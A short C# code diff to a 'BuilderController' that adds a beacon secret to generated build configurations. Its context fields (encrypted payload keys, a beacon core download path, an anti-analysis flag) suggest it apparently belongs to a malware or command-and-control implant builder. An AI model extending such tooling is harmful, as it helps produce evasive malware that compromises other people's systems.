@@ -5,7 +5,9 @@ using System.Text;
 using System.Text.Json;
 using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Options;
 using LibraNextgen.Common.Models;
+using LibraNextgen.Service.Configuration;
 
 namespace LibraNextgen.Service.Controllers;
 
@@ -30,6 +32,13 @@ public class BuilderController : ControllerBase
     private static readonly string IconUploadDir = Path.Combine(Path.GetTempPath(), "libra-build-icons");
     private static readonly object _buildLock = new();
     private static readonly ConcurrentDictionary<string, BuildJob> _activeJobs = new();
+
+    private readonly BeaconSettings _beaconSettings;
+
+    public BuilderController(IOptions<BeaconSettings> beaconSettings)
+    {
+        _beaconSettings = beaconSettings.Value;
+    }
 
     // ── Build history persistence ──────────────────────────────────────
 
@@ -605,6 +614,7 @@ public class BuilderController : ControllerBase
                 encrypted_aes_key = encryptedAesKeyB64,
                 core_download_path = $"/api/beacon/core/{buildId}",
                 rsa_private_key = rsaPrivateKey,
+                beacon_secret = _beaconSettings.Secret,
                 anti_analysis = req.AntiAnalysis,
             };
 
